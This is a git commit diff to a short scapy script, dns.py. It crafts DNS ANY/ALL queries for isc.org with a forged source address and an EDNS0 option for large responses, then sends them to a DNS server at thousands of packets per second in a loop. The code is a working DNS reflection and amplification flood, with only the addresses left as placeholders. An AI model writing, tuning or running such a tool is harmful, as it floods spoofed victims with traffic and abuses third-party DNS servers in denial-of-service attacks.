f05d61b4e7eaaed397aa43703bc74fd557402c6c
Theo Baschak <theodore@ciscodude.net>
2014-03-05 23:40:06 -0600

    fix ANY queries, in scapy they are ALL queries. make EDNS0 requests work, requires scapy 2.2.0 dev

--- dns.py
+++ dns.py
@@ -3,6 +3,6 @@ fakesrc = 'x.x.x.x'
 server = 'x.x.x.x'
 device = 'xxx'
 
-mypacket = IP(dst=server, src=fakesrc)/UDP(dport=53, sport=8000)/DNS(rd=1, qd=DNSQR(qname="isc.org", qtype="ANY"))
+mypacket = IP(dst=server, src=fakesrc)/UDP(sport=RandShort())/DNS(rd=1L, qd=DNSQR(qname="isc.org.", qtype="ALL", qclass="IN"), ar=DNSRROPT(rclass=4096))
 l2packet = Ether()/mypacket
 sendpfast( l2packet*10000, pps=2500, loop=10, iface=device, file_cache=True )
